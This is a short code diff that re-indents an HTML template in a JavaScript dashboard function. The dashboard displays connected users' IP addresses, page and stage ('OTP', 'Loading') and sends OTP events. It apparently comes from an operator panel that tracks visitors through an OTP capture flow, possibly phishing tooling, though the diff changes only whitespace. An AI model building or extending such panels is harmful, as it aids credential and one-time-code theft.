@@ -86,23 +86,26 @@ function updateConnectionsTable(users) {
             console.log('emit otp send')
           });          
     } else if(details.stage == "OTP") {
-      userDiv.innerHTML = `
-        
-      <h5 class="card-title fw-semibold mb-4 badge bg-${color}">${details.status}</h5>
-      <div class="card">
-        <div class="card-header">
-          <span class="badge bg-${color}">
-            ${ipAddress}
-          </span>
-        </div>
-        <div class="card-body">
-          <h5 class="card-title">${details.page || ''}</h5>
-          <p class="card-text">${details.stage || ''}</p>
-          <a href="#" class="m-1 btn btn-primary results-button">See Result</a>
-        </div>
-      </div>
 
-      `;
+        userDiv.innerHTML = `
+        
+        <h5 class="card-title fw-semibold mb-4 badge bg-${color}">${details.status}</h5>
+        <div class="card">
+          <div class="card-header">
+            <span class="badge bg-${color}">
+              ${ipAddress}
+            </span>
+          </div>
+          <div class="card-body">
+            <h5 class="card-title">${details.page || ''}</h5>
+            <p class="card-text">${details.stage || ''}</p>
+            <a href="#" class="m-1 btn btn-primary results-button">See Result</a>
+          </div>
+        </div>
+  
+        `;
+      
+      
     } else if(details.stage == "Loading"){
 
       userDiv.innerHTML = `
